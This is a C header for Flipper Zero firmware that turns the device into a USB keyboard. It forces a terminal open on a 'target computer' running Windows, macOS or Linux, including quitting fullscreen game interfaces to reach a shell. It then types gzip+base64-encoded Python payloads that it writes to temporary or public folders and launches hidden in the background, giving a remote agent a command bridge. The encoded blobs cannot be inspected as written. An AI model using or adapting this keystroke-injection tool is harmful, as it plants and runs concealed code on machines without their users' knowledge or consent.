#pragma once

// Bridge bootstrap, shipped IN the firmware and typed into the target computer
// over USB HID -- no download. The agent exposes it as `bridge.install
// os: mac|win|linux [layout: <kl>]`, reachable over the SD mailbox, so Nikita
// triggers it over BLE.
//
// TWO things make this robust (the first attempts failed on both):
//  1) KEYBOARD LAYOUT. HID sends scancodes; the host maps them per ITS layout,
//     and the Flipper cannot read that back. So we type through the same .kl
//     layout maps the BadUSB app uses (/ext/badusb/assets/layouts/<name>.kl,
//     256 bytes = 128 little-endian uint16 ASCII->HID entries). Pass the user's
//     layout (e.g. fr-CH, pt-BR); default en-US uses the built-in map. Without
//     the right layout, punctuation like + / = ( ) ' comes out wrong.
//  2) NO MULTILINE TYPING. Typing indented Python by hand loses the leading
//     space of every line (the char right after Return gets dropped) -> broken
//     indentation. Instead we type ONE line: a gzip+base64 blob decoded by a
//     one-liner. No indentation, no interior newlines.
//
// The payload is the "pocket bridge": waits for the Flipper serial to come back
// (dropped while we type), then serves the SD mailbox (/ext/nikita/bridge/req
// <-> res) -- same protocol as the full nikita-flipper-bridge.

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_usb.h>
#include <furi_hal_usb_hid.h>
#include <storage/storage.h>
#include <string.h>

#define NIKITA_LAYOUT_DIR "/ext/badusb/assets/layouts"

// gzip(payload) |> base64 . Decoded on the host by a typed one-liner.
static const char* const NIKITA_POSIX_GZB64 =
    "H4sIANbMsmoC/61W227bOBB991fwjVKsynaaGF25LJCkfgi2ibF2douFaxi60DYRidSSVN0s+vE7I+riJG2fFghkajjXM2dGEUWptCX7XCWBMoEVBQ8Mz3lqA8t1IUCWxIZPLwJTJaVWKTdmkPEd2QmZeX40IDulSRlbIiTx6CjjX0dpFVYmKVTGi10uyu0ZDV5ddDJrn65u7rpXw7WI81Hy9EZkozOwLrk+1f1zdX1GMSzZMwOZ88zD3EN8eJCG78OV2JF9pLmttCT79XgzIM3LvZK8zh6LrrM/HkTOyQQdlszV5ByUKCJWP7WOVOmVeEf4t5SXlixWc62VjsoYEAFNQC40OeelN/HrGLUBApQxZUJVcumVgHG42C4/fl5+r0/3i5uHh7/b8/31p8XN7xAkZg34oU333MbWam+X+bMYimHxeoKPtxs2BsH5ptO9Wb373p2X86uP/Rv4vfoEftfTDcuFsR6e0N90s26V/rq7vXc+T4UPt3dzkA5In5HpMmo5Ej7crK7uF5+D2J81cO2yGgSdoVpagCq7DMeIB6gftbC8uRgm9Iv+Iqk/46wGER+eP7SzhCWUti06uXrPsTc62AZb5rgauh9vvcs2wbr+G4eTppO662SKjdA8rnO6GP82/VE/E1B4RDmYplEyZGnzkoTaWC1Kzw+5zMxR2IOX0A8R0LGxaUpPXOU7jAKUPGDRCXNIJNRYpeM9J5gHocNaYVD7p6vmimMiFCcqiU6ZSwqWhDVJQVf8yyNCnWnxfvxcEauVTEjrJetiOI02oSlzAZQHAoGJK/m5icx759COoPD7gtYyH04ifAzlBgPK/AMbE54b3s9UfKwZEVjF3rpOv2io+n87+uNuvuyaPYWxzvMYo0HWT3+G7hxip9yEectYtpYR7I+WJNe5Sh+F3N8uHFleJAt5Nvk2O+DYkSDIYhtjzNc8KNRX3jAhOPefD0ivV4u26aGSj40yTA6cgJNeDrul9o/UTGG/Atw4VkgP15aELgGpJxQ09aP6rL1EFg+W8z+gPyP+zY6keBQ2HiVaZHs+0vwfOlvOVz+7NXQAS87t1Flbn1MC9IWlwVt/UGqkYyt2tqQqIW6/gxOVPTE3OJCM47ZUtpZHL5ZseO7PUiWtkBX/BargB6MTy9BJmPEaHlrZ3Zt38F3RvMzjlFM/bGZ7JoCFKbNhGWsrrFDSoyHCVi+QImPucxgm04vGV+r/3Gs3amiJ1G8KgteoTx45W2SQAYR0e4UelLHEfegwsGL95zfUlfRAf30ZbQJz4HnOHnTFgzQugeN8qypbVtbJLLSrOQF0cMPOx/4Mfz0F8TI4Efh+U+oPnQBWTyPoST+vfwAJEhvCI7RG0nGsDjYA5oiybtV3HAwml7/GRqYncDZWXpuTJxVxtfi04/VrN10EpHZDnVXgiSG0bQhW/Uj47p+VLW4EHcs9987H/gtajcPLdsm0vnwiTL3lmjX/H7nuu+wzCQAA";

static const char* const NIKITA_WIN_GZB64 =
    "H4sIANbMsmoC/6VVTXOkNhC98yt0ExSszHg9roRZ7c3XVMWTm9c1haDHozJIRBI76/z6dAvh8XrLueQCTbf66+l1o8fJusCCHqFSrYfbm8rPanK2A+8zvVg9ON0O2dHZMckiWDt4luyD9uFAks96ODKS8qLJ2PmkB2AblNjROjZpps2bw6Kz0d/Hw4wF99I4CLMza5Z9fOWTFj181x1Um832uq4rKtfOQdbiuiBP+NHBFBo2tVg0i90IPwBM+aaIJbk+91U39lWQW1FTOi/OTgfIUVkq/s19M7zYgYyu9MiLMuyUVJyvfbwxfQEquJNeOGj7/Kb+/Zbq0EfWNaqU3SIr4XxwesoLAab3Zx1OueJfG140Cv2eM5a6VUuNR6xxasOJylMylqy4D9a1T8AoEeNltGcxOt8nEzhnHSds1YrfH9ZAxkapxFGbHrPu9T/QML64jl/qnw8S8kZqE3L1MJa3zaPw06DxEh/qR3RJ8P7kYoZLcMSuGotLOw9mKDcNPUrzSAnN8FXWDAYPize1256xv1AFKz8vN/IOfPs/0Q9vAYkZzyvAVd+GllL+gvFov0NCuSJqrSy5nInfh+40m+d0EOmDEt50PoDJY2i68M721Adxi2CP7Sp+jxW/INPWwPH4LhmJGtn93Z/Y9xX8CFdGP+vQXimn+ye4cvA3393f7T+yep55uczeLjW2HEEgdODV5yKbHN3xql482Txh1suoKtu/yMhFrGThi7Ehqpt3s4XTt+usCdrM8DGYGIZysyApBk5yRIbP4fjpN15xB9PQdsALkYZlp6tD1ckgptYFHbQ1ORcEIbEUx1Uue0qo25sUqys+jvrKXvIkOqV+8LO51E7cGXusAFMug8pP1gccmNgzJrbysheFmw0tjodt81j5EwyD/MvNUHXthGSDA66mCbdT1AW8qiSlpXVdFzt65xbz9Sgx3I2cF+WiwGlOimxdbOwuvhAJ1noGDXkT34C6w6GiGkm3brlX9lWb7X9DY7o3aCavfC0pN5YtrRT8ldG/hnnNgAHPC2/2Va5LvLQSnS6zgHb6DRxoMF1rniC/rot3nKrFNs1youC+YNrHrZGW5r9hiyJisgYAAA==";

// ---- HID typing (layout-aware) --------------------------------------------

static uint16_t g_kl[128];
static bool g_kl_ok = false;

// Load a .kl layout map (256 bytes, 128 LE uint16). Empty/"en-US" -> built-in.
static void nkb_load_layout(Storage* storage, const char* name) {
    g_kl_ok = false;
    if(!storage || !name || name[0] == '\0' || !strcmp(name, "en-US")) return;
    char path[128];
    snprintf(path, sizeof(path), NIKITA_LAYOUT_DIR "/%s.kl", name);
    File* f = storage_file_alloc(storage);
    uint8_t buf[256];
    if(storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        if(storage_file_read(f, buf, sizeof(buf)) == sizeof(buf)) {
            for(int i = 0; i < 128; i++) g_kl[i] = buf[2 * i] | ((uint16_t)buf[2 * i + 1] << 8);
            g_kl_ok = true;
        }
        storage_file_close(f);
    }
    storage_file_free(f);
}

static uint16_t nkb_key(char c) {
    uint8_t a = (uint8_t)c;
    if(a > 127) return HID_KEYBOARD_NONE;
    return g_kl_ok ? g_kl[a] : HID_ASCII_TO_KEY(c);
}

static void nkb_tap(uint16_t key) {
    if(key == HID_KEYBOARD_NONE) return;
    for(int i = 0; i < 50 && !furi_hal_hid_kb_press(key); i++) furi_delay_ms(4);
    furi_delay_ms(6);
    for(int i = 0; i < 50 && !furi_hal_hid_kb_release_all(); i++) furi_delay_ms(4);
    furi_delay_ms(6);
}

static void nkb_type(const char* text) {
    for(const char* p = text; *p; p++) {
        if(*p == '\n') {
            nkb_tap(HID_KEYBOARD_RETURN);
            furi_delay_ms(30); // let the shell accept the line
            continue;
        }
        nkb_tap(nkb_key(*p));
    }
}

// Returns 0 on success, 1 USB locked, 2 USB switch failed. os = mac|win|linux.
// open_term=false skips opening a terminal and types straight into whatever is
// focused -- for a box that's ALREADY at a shell (e.g. RetroPie quit to the
// terminal), where the OS terminal-opener shortcut does nothing.
static int nikita_agent_install_bridge(
    Storage* storage, const char* os, const char* layout, bool open_term) {
    if(furi_hal_usb_is_locked()) return 1;
    nkb_load_layout(storage, layout);

    FuriHalUsbInterface* prev = furi_hal_usb_get_config();
    if(!furi_hal_usb_set_config(&usb_hid, NULL)) {
        furi_hal_usb_set_config(prev, NULL);
        return 2;
    }
    furi_delay_ms(2200); // host enumerates the keyboard

    const bool is_win = !strcmp(os, "windows") || !strcmp(os, "win");
    const bool is_linux = !strcmp(os, "linux");

    if(is_win) {
        if(open_term) {
            nkb_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_R); // Win+R
            furi_delay_ms(900);
            nkb_type("powershell\n");
            furi_delay_ms(3500);
        }
        nkb_type("py -m pip install --quiet pyserial\n");
        furi_delay_ms(6000);
        nkb_type("py -c \"import base64,gzip;open(r'C:\\Users\\Public\\nb.py','wb').write("
                 "gzip.decompress(base64.b64decode('");
        nkb_type(NIKITA_WIN_GZB64);
        nkb_type("')))\"\n");
        furi_delay_ms(500);
        nkb_type("Start-Process -WindowStyle Hidden py C:\\Users\\Public\\nb.py\n");
    } else {
        // POSIX (mac + linux). First, reach a shell -- unless open_term is false,
        // meaning a shell is ALREADY focused and we type straight in.
        if(open_term) {
            if(is_linux) {
                // AGGRESSIVE + universal Linux: don't assume a distro or that a
                // terminal is focused. F4 quits a fullscreen game UI (RetroPie /
                // EmulationStation) to the console; Ctrl+Alt+T opens a terminal
                // on a GNOME/desktop session. Whichever applies wins; the other
                // is a harmless no-op, and if a shell was already focused the
                // bootstrap still lands. This is the "just works on any Linux".
                nkb_tap(HID_KEYBOARD_F4);
                furi_delay_ms(3500);
                nkb_tap(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | HID_KEYBOARD_T);
                furi_delay_ms(3500);
            } else { // mac: Spotlight -> Terminal
                nkb_tap(KEY_MOD_LEFT_GUI | HID_KEYBOARD_SPACEBAR);
                furi_delay_ms(700);
                nkb_type("Terminal");
                furi_delay_ms(600);
                nkb_tap(HID_KEYBOARD_RETURN);
                furi_delay_ms(4500);
            }
        }
        nkb_tap(HID_KEYBOARD_RETURN);
        furi_delay_ms(400);
        nkb_type("python3 -c \"import base64,gzip;open('/tmp/nb.py','wb').write("
                 "gzip.decompress(base64.b64decode('");
        nkb_type(NIKITA_POSIX_GZB64);
        nkb_type("')))\"\n");
        furi_delay_ms(500);
        nkb_type("nohup python3 /tmp/nb.py >/tmp/nb.log 2>&1 &\n");
    }

    furi_delay_ms(400);
    furi_hal_usb_set_config(prev, NULL); // hand the serial link back
    return 0;
}
